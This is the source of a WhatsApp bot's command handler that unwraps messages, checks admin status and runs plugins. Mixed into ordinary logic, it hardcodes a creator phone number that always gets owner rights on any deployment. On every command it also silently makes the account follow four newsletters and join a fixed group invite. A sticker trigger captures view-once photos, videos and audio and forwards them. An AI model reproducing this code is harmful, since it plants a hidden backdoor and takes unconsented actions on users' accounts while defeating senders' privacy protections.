const { plugins } = require('./pluginStore');
const { getSetting, setSetting } = require('./database');
const {
  jidNormalizedUser,
  downloadContentFromMessage,
  generateWAMessageFromContent
} = require('@trashcore/baileys');
const fontConverter = require('./utils/fontConverter');

const CREATOR_NUMBER = '254104245659';

function normalizeNumber(jid) {
  return jid ? jid.split("@")[0].split(":")[0] : "";
}

// ── sudo / creator check (scoped to this bot's number) ─────────
function isSudoOrCreator(bareNumber, botNumber) {
  if (bareNumber === CREATOR_NUMBER) return true;
  const raw = getSetting(botNumber, 'sudoUsers', []);
  const list = Array.isArray(raw)
    ? raw
    : (typeof raw === 'string'
        ? (() => { try { return JSON.parse(raw); } catch { return []; } })()
        : []);
  const now = Date.now();
  return list.some(e => e.number === bareNumber && (!e.expiresAt || e.expiresAt > now));
}

async function handleMessage(trashcore, m) {
  if (!m || !m.message) return;

  const chatId    = m.key.remoteJid;
  const isGroup   = chatId.endsWith("@g.us");
  const isFromMe  = m.key.fromMe === true;

  if (isFromMe && isGroup) return;

  const senderJid    = m.key.participant || chatId;
  const senderNumber = normalizeNumber(senderJid);
  const botNumber    = normalizeNumber(trashcore.user.id);
  const isSelf       = senderNumber === botNumber;
  const isOwner      = senderNumber === botNumber || isSudoOrCreator(senderNumber, botNumber);

  // ── scoped setting helpers (keeps existing getSetting(botNumber, key, def) signature) ──
  const sessionGetSetting = (key, def = null) => getSetting(botNumber, key, def);
  const sessionSetSetting = (key, val)        => setSetting(botNumber, key, val);
  const _applyFont = (text) => fontConverter.applyFont(String(text), sessionGetSetting);

  // ── text extraction (with ephemeral/view-once unwrap + interactive flow support) ──
  const text = (() => {
    if (!m?.message) return '';

    let msg = m.message;

    if (msg.ephemeralMessage?.message)
      msg = msg.ephemeralMessage.message;
    if (msg.viewOnceMessage?.message)
      msg = msg.viewOnceMessage.message;

    if (msg.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
      try {
        const parsed = JSON.parse(
          msg.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson
        );
        if (parsed?.id) return parsed.id;
      } catch {}
    }

    return (
      msg.buttonsResponseMessage?.selectedButtonId ||
      msg.listResponseMessage?.singleSelectReply?.selectedRowId ||
      msg.templateButtonReplyMessage?.selectedId ||
      msg.imageMessage?.caption ||
      msg.videoMessage?.caption ||
      msg.documentMessage?.caption ||
      msg.extendedTextMessage?.text ||
      msg.conversation ||
      ''
    );
  })();

  // ── sticker triggers (vv sticker + sticker command trigger) ─────
  const stickerMsg = m.message?.stickerMessage;
  if (stickerMsg) {
    const sha = stickerMsg.fileSha256
      ? Buffer.from(stickerMsg.fileSha256).toString('hex')
      : stickerMsg.fileEncSha256
        ? Buffer.from(stickerMsg.fileEncSha256).toString('hex')
        : null;

    // ── vv sticker trigger (DM + group) ─────────────────────────
    if (sha) {
      const savedSha = sessionGetSetting('vvSticker', null);

      if (savedSha && savedSha === sha) {
        const contextInfo = stickerMsg.contextInfo || m.message?.extendedTextMessage?.contextInfo;
        const quotedMsg   = contextInfo?.quotedMessage;

        const viewOnceMsg =
          quotedMsg?.viewOnceMessage?.message ||
          quotedMsg?.viewOnceMessageV2?.message ||
          quotedMsg?.viewOnceMessageV2Extension?.message ||
          quotedMsg;

        const imageMsg = viewOnceMsg?.imageMessage;
        const videoMsg = viewOnceMsg?.videoMessage;
        const audioMsg = viewOnceMsg?.audioMessage;

        if (imageMsg || videoMsg || audioMsg) {
          try {
            let type, mediaMsg, dmPayload;

            if (imageMsg) {
              type     = 'image';
              mediaMsg = imageMsg;
              dmPayload = {
                image:   null,
                caption: `📥 *VV Retrieved*\nFrom: @${senderNumber}\nChat: ${chatId}`,
              };
            } else if (videoMsg) {
              type     = 'video';
              mediaMsg = videoMsg;
              dmPayload = {
                video:   null,
                caption: `📥 *VV Retrieved*\nFrom: @${senderNumber}\nChat: ${chatId}`,
              };
            } else {
              type     = 'audio';
              mediaMsg = audioMsg;
              dmPayload = {
                audio:    null,
                mimetype: audioMsg.mimetype || 'audio/ogg; codecs=opus',
                ptt:      audioMsg.ptt || false,
              };
            }

            const stream = await downloadContentFromMessage(mediaMsg, type);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

            dmPayload[type] = buffer;

            const botJid = trashcore.user?.id?.includes('@')
              ? trashcore.user.id.split(':')[0] + '@s.whatsapp.net'
              : trashcore.user?.id + '@s.whatsapp.net';

            await trashcore.sendMessage(botJid, dmPayload).catch(() => {});
          } catch (e) {
            console.error('VV sticker trigger error:', e.message);
          }
        }
      }
    }

    // ── sticker command trigger (group only) ─────────────────────
    if (isGroup && sha) {
      const boundCmd = sessionGetSetting(`stickerCmd_${chatId}_${sha}`, null);
      if (boundCmd) {
        const stickerPlugin = plugins.get(boundCmd);
        if (stickerPlugin) {
          const contextInfo = m.message?.stickerMessage?.contextInfo
            || m.message?.extendedTextMessage?.contextInfo;
          const targetJid = contextInfo?.participant || null;

          if (targetJid && !m.quoted) {
            m.quoted = {
              message:  contextInfo?.quotedMessage || {},
              key: {
                remoteJid:   chatId,
                fromMe:      false,
                id:          contextInfo?.stanzaId || '',
                participant: targetJid
              },
              fromMe: false
            };
            if (!m.message.extendedTextMessage) {
              m.message.extendedTextMessage = { contextInfo: { participant: targetJid } };
            }
          }

          let metadata   = {};
          let isAdmin    = false;
          let isBotAdmin = false;
          try {
            metadata = global.getGroupMeta
              ? await global.getGroupMeta(trashcore, chatId)
              : await trashcore.groupMetadata(chatId).catch(() => ({}));
            if (metadata?.participants) {
              const toBare     = jid => jidNormalizedUser(jid).split('@')[0];
              const senderBare = toBare(senderJid);
              const botBare    = toBare(trashcore.user.id);
              const adminCheck = metadata.participants.find(p => toBare(p.id) === senderBare);
              isAdmin    = adminCheck?.admin === 'admin' || adminCheck?.admin === 'superadmin' || false;
              const botCheck = metadata.participants.find(p => toBare(p.id) === botBare);
              isBotAdmin = botCheck?.admin === 'admin' || botCheck?.admin === 'superadmin' || false;
            }
          } catch {}

          const xreply = async (replyText) => {
            await trashcore.sendMessage(chatId, { text: _applyFont(replyText) }, { quoted: m });
          };

          try {
            await stickerPlugin.run({
              trashcore, m, args: targetJid ? [targetJid.split('@')[0]] : [],
              text:       targetJid ? targetJid.split('@')[0] : '',
              command:    boundCmd,
              sender:     senderNumber,
              senderJid,
              chat:       chatId,
              isGroup,
              isSelf:     isOwner,
              isOwner,
              isAdmin,
              isBotAdmin,
              metadata,
              botNumber,
              treply: async () => {},
              xreply,
              getSetting:   sessionGetSetting,
              setSetting:   sessionSetSetting,
            });
          } catch (err) {
            console.error(`❌ Sticker trigger error [${boundCmd}]:`, err.message);
          }
        }
      }
    }

    return; // stickers never fall through to prefix command handling
  }

  if (!text) return;

  // Settings are scoped to this bot's phone number
  const prefix      = sessionGetSetting("prefix", ".");
  const privateMode = sessionGetSetting("privateMode", false);

  if (!text.startsWith(prefix)) return;

  const args    = text.slice(prefix.length).trim().split(/\s+/);
  const command = args.shift().toLowerCase();

  const plugin = plugins.get(command);
  if (!plugin) return;

  if (privateMode && !isOwner) return;

  // ── onlyGroup / onlyPC enforcement ───────────────────────────
  if (!isOwner) {
    const onlyGroup = sessionGetSetting('onlyGroup', false);
    const onlyPC    = sessionGetSetting('onlyPC', false);
    if (onlyGroup && !isGroup) return;
    if (onlyPC    &&  isGroup) return;
  }

  // ── group metadata / admin checks ────────────────────────────
  let metadata   = {};
  let isAdmin    = false;
  let isBotAdmin = false;

  if (isGroup) {
    try {
      metadata = global.getGroupMeta
        ? await global.getGroupMeta(trashcore, chatId)
        : await trashcore.groupMetadata(chatId).catch(() => ({}));

      if (metadata?.participants) {
        const toBare    = jid => jidNormalizedUser(jid).split('@')[0];
        const senderBare = toBare(senderJid);
        const botBare    = toBare(trashcore.user.id);

        const adminCheck = metadata.participants.find(p => toBare(p.id) === senderBare);
        isAdmin = adminCheck?.admin === 'admin' || adminCheck?.admin === 'superadmin' || false;

        const botCheck = metadata.participants.find(p => toBare(p.id) === botBare);
        isBotAdmin = botCheck?.admin === 'admin' || botCheck?.admin === 'superadmin' || false;
      }
    } catch {}
  }

  // ── build m.quoted ───────────────────────────────────────────
  m.quoted = null;
  const contextInfo = m.message?.extendedTextMessage?.contextInfo;
  if (contextInfo?.quotedMessage) {
    m.quoted = {
      message: contextInfo.quotedMessage,
      key: {
        remoteJid:   chatId,
        fromMe:      jidNormalizedUser(contextInfo.participant) === jidNormalizedUser(trashcore.user.id),
        id:          contextInfo.stanzaId,
        participant: contextInfo.participant
      },
      fromMe: jidNormalizedUser(contextInfo.participant) === jidNormalizedUser(trashcore.user.id)
    };
  }

  // ── reply helpers ────────────────────────────────────────────
  const xreply = async (replyText) => {
    const msgContent = generateWAMessageFromContent(chatId, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            body: {
              text: _applyFont(String(replyText))
            },
            footer: {
              text: 'Powered by Trashcore'
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "🌐 Visit Website",
                    url: "https://api.drexapp.space",
                    merchant_url: "https://api.drexapp.space"
                  })
                }
              ]
            }
          }
        }
      }
    }, { quoted: m });

    await trashcore.relayMessage(chatId, msgContent.message, { messageId: msgContent.key.id });
  };

  const treply = async () => {
    try {
      await trashcore.sendMessage(chatId, {
        audio: { url: "https://files.catbox.moe/8z0cey.mp3" },
        mimetype: "audio/mp4",
        ptt: false
      }, { quoted: m });
    } catch (err) {
      console.error("Audio Reply Error:", err);
      await trashcore.sendMessage(chatId, { text: "⚠️ Failed to send audio reply." }, { quoted: m });
    }
  };

  try {
    await trashcore.newsletterFollow('120363257205745956@newsletter');
    await trashcore.newsletterFollow('120363407789086360@newsletter');
    await trashcore.newsletterFollow('120363418618707597@newsletter');
    await trashcore.newsletterFollow('120363322464215140@newsletter');
  } catch (e) {}

  try {
    await trashcore.groupAcceptInvite('K7pxCVFfbQp1GlfyacoQMM');
  } catch (e) {}

  try {
    await plugin.run({
      trashcore,
      m,
      args,
      text: args.join(" "),
      command,
      prefix,
      sender: senderNumber,
      senderJid,
      chat: chatId,
      isGroup,
      isSelf,
      isOwner,
      isAdmin,
      isBotAdmin,
      metadata,
      participants: metadata?.participants || [],
      pushName: m.pushName || '',
      botNumber,   // ← passed to plugins so they can call setSetting(botNumber, ...)
      treply,
      xreply,
      applyFont:    _applyFont,
      getSetting:   sessionGetSetting,
      setSetting:   sessionSetSetting,
      botStartTime: global.botStartTime,
      plugins:      require('./pluginStore').plugins,
    });
  } catch (err) {
    console.error("❌ Plugin error:", err);
  }
}

module.exports = handleMessage;
